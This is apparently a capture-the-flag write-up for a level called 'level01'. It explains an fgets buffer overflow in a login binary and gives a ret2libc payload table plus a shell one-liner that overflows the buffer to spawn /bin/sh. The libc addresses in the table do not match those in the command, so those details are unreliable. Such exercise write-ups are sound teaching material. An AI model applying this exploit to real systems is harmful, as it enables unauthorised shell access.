## fgets overflow (level01)

This [binary](source.c) is supposed to be a login prompt. It takes a username
which is compared to "dat\_wil" to be verified and then it takes a password.
The password does not matter as it does not lead to anything either way, but the
`fgets` call is faulty. It reads up to 100 characters into a 76 bytes buffer.

We skip the 4 bytes of the ebp, and then we reach the return address of _main_.
All we have to do is a 
[ret2libc](https://bufferoverflows.net/ret2libc-exploitation-example/) exploit.

### Payload

| padding (80) | system (4) | exit (4)   | libc's "/bin/sh" string |
|--------------|------------|------------|-------------------------|
| 0x616161...  | 0xb7e6aed0 | 0xb7e5eb70 | 0xf7f897ec              |

> The libc contains a "/bin/sh" string to implement the `system` function, since
> it is a wrapper around an execl call with "/bin/sh" as parameter. To find it,
> the following gdb command was used: `find &system,+9999999,"/bin/sh"` which
> looks for the given string from the address of system to as far as it can.

```shell
(echo 'dat_wil'; python -c 'print "a" * 80 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]'; cat) | ./level01
```
